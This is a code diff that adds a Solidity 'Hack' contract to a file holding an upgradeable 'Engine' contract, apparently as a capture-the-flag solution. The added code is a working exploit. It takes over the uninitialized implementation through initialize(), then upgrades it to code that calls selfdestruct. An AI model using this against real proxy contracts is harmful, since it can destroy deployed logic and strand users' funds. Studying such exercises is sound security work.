@@ -126,3 +126,26 @@ contract Engine is Initializable {
         r.value = newImplementation;
     }
 }
+
+interface IEngine {
+    function upgrader() external view returns (address);
+}
+
+contract Hack {
+    // Implementation Slot: "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
+    // Implementation Slots value: "0x00000000000000000000000038b8daa1c50992832ed0f9f30520a7e232ad3ae6"
+    // => Implementation address = 0x38b8daa1c50992832ed0f9f30520a7e232ad3ae6
+    // upgrader = 0x0000000000000000000000000000000000000000
+
+    function attack(Engine _engine) external {
+        _engine.initialize();
+        _engine.upgradeToAndCall(
+            address(this),
+            abi.encodeWithSelector(this.destroyEngine.selector)
+        );
+    }
+
+    function destroyEngine() external {
+        selfdestruct(payable(address(0)));
+    }
+}
